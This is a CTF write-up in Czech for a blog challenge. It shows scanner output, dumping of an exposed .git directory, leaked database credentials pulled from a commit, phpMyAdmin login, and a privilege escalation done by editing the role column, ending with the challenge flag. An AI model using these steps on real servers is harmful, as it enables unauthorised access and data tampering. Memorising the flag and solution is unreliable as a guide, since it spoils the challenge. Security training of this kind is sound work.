# Blog site (4)

## Zadání

Hi, packet inspector,

a simple blog webpage was created where all employees can write their suggestions for improvements. It is one part of the optimization plan designed by our allmighty AI.

Examine the web <http://blog.mysterious-delivery.tcc:20000/> and find any interesting information.

May the Packet be with you!

## Nápovědy (Hints)

1\. Use VPN to get access to the server.

2\. Any employee of Mysterious Delivery, Ltd. can contribute to the blog – do not trust any information (notably flags) appearing in posts.

## Řešení

Zkusíme se zaregistrovat a vložit příspěvek s paylodem, který by využil SSTI (Server Side Template Injection), ale to nevypadá, jako správná cesta. Server je vytvořen z tutorialu <https://flask.palletsprojects.com/en/2.2.x/tutorial/blog/>, takže tam v tomhle směru asi žádná chyba nebude. Po přihlášení se v menu objeví položka `Settings`, která ale není přístupná.

```text
Forbidden

You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.
```
---
Projedem server nějakými diagnostickými nástroji, jestli server neobsahuje nějaké další stránky, na které není odkaz.

```text
$ nikto -h blog.mysterious-delivery.tcc -p 20000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          blog.mysterious-delivery.tcc
+ Target Hostname:    blog.mysterious-delivery.tcc
+ Target Port:        20000
+ Start Time:         2022-10-15 14:45:35 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.54 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, OPTIONS
+ Cookie phpMyAdmin created without the httponly flag
+ Cookie goto created without the httponly flag
+ Cookie back created without the httponly flag
+ Cookie pma_lang created without the httponly flag
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ /phpmyadmin/: phpMyAdmin directory found
+ Server leaks inodes via ETags, header found with file /.git/index, fields: 0xa3b 0x5eb03a9ec5db4
+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2022-10-15 14:46:58 (GMT2) (83 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Jsou zajímavé dvě řádky

```text
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
```

Můžeme zkusit ještě další

```text
$ dirb http://blog.mysterious-delivery.tcc:20000

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Oct 15 14:49:14 2022
URL_BASE: http://blog.mysterious-delivery.tcc:20000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://blog.mysterious-delivery.tcc:20000/ ----
+ http://blog.mysterious-delivery.tcc:20000/.git/HEAD (CODE:200|SIZE:23)
+ http://blog.mysterious-delivery.tcc:20000/create (CODE:302|SIZE:209)
+ http://blog.mysterious-delivery.tcc:20000/hello (CODE:200|SIZE:13)
==> DIRECTORY: http://blog.mysterious-delivery.tcc:20000/javascript/
==> DIRECTORY: http://blog.mysterious-delivery.tcc:20000/phpmyadmin/
+ http://blog.mysterious-delivery.tcc:20000/server-status (CODE:403|SIZE:279)
+ http://blog.mysterious-delivery.tcc:20000/settings (CODE:302|SIZE:209)

---- Entering directory: http://blog.mysterious-delivery.tcc:20000/javascript/ ----
==> DIRECTORY: http://blog.mysterious-delivery.tcc:20000/javascript/jquery/

---- Entering directory: http://blog.mysterious-delivery.tcc:20000/phpmyadmin/ ----
==> DIRECTORY: http://blog.mysterious-delivery.tcc:20000/phpmyadmin/doc/
...
```

Zde stejně zajímavé stránky

```text
+ http://blog.mysterious-delivery.tcc:20000/.git/HEAD (CODE:200|SIZE:23)
==> DIRECTORY: http://blog.mysterious-delivery.tcc:20000/phpmyadmin/
```

To znamená, že je na serveru přístupný `.git` adresář, což je zranitelnost, kterou využijeme. Stáhneme ze serveru celý git repozitář pomocí <https://github.com/WangYihang/GitHacker> nebo <https://github.com/arthaud/git-dumper>

```text
$ githacker --url http://blog.mysterious-delivery.tcc:20000/.git/ --output-folder result
2022-10-15 09:10:26 INFO 1 urls to be exploited
2022-10-15 09:10:26 INFO Exploiting http://blog.mysterious-delivery.tcc:20000/.git/ into result/d45267fdd99518ec8042a09a02c5f355
2022-10-15 09:10:26 INFO Downloading basic files...
2022-10-15 09:10:26 ERROR [293 bytes] 404 .git/FETCH_HEAD
2022-10-15 09:10:26 INFO [18 bytes] 200 .git/COMMIT_EDITMSG
2022-10-15 09:10:26 INFO [73 bytes] 200 .git/description
2022-10-15 09:10:26 INFO [23 bytes] 200 .git/HEAD
2022-10-15 09:10:26 INFO [2619 bytes] 200 .git/index
2022-10-15 09:10:26 INFO [240 bytes] 200 .git/info/exclude
2022-10-15 09:10:26 INFO [5523 bytes] 200 .git/logs/HEAD
2022-10-15 09:10:26 ERROR [293 bytes] 404 .git/logs/refs/remotes/origin/HEAD
2022-10-15 09:10:26 ERROR [293 bytes] 404 .git/logs/refs/stash
2022-10-15 09:10:26 INFO [41 bytes] 200 .git/ORIG_HEAD
2022-10-15 09:10:26 ERROR [293 bytes] 404 .git/packed-refs
2022-10-15 09:10:26 ERROR [293 bytes] 404 .git/refs/remotes/origin/HEAD
...
```

Stažený repozitář je zde [git_repo.zip](git_repo.zip)

---
Dále zkusíme otevřít další nalezenou stránku <http://blog.mysterious-delivery.tcc:20000/phpmyadmin/>. Otevře se přihlašovací dialog `phpMyAdmin` do které ale neznáme heslo.

Prozkoumáme tedy git repozitář. Po chvíli hledání narazíme na zajímavý commit `777c4dc8a31c74b2f787b38670def0aaaa412fe7`, ve kterém se mění přihlašovací údaje v souboru `flaskr/db.py`.

```diff
-        g.db = mysql.connector.connect(user='ctfb5', password='56843437e5c747a2c9c08e4b79f109c3', database='ctfb5', autocommit=True)
+        g.db = mysql.connector.connect(host='dbserver', user='attendance', password='ATTENDANCEPASSWORD', database='attendance', autocommit=True)
```

Zkusíme je zadat do `phpMyAdmin`.

`ctfb5 / 56843437e5c747a2c9c08e4b79f109c3` - nefunguje

`attendance / ATTENDANCEPASSWORD` - nefunguje

`ctfb5 / ATTENDANCEPASSWORD` - nefunguje

`attendance / 56843437e5c747a2c9c08e4b79f109c3` - funguje 👍

Máme tedy přístup do SQL databáze.

---
Prozkoumáme ještě soubor `flaskr/blog.py` a zjistíme, proč nejde otevřít stránka z menu `Settings`.

```python
@bp.route("/settings")
@login_required
def settings():
    """Configure blog"""

    if (not g.user["role"]) or ("admin" not in g.user["role"].split(",")):
        abort(403)

    return render_template("blog/settings.html")
```

Server tedy vyžaduje u uživatele ve sloupci `role` hodnotu `admin`.

Protože již máme přístup k SQL serveru, tak jí tam pro našeho uživatele zapíšeme.

Nyní je již stránka `Settings` přístupná a získáme flag.

PS: Z phpMyAdmin můžeme měnit i ostatní uživatele a jejich příspěvky a zakládat nové tabulky.

## Flag

`FLAG{gDfv-5zlU-spVN-D4Qb}`
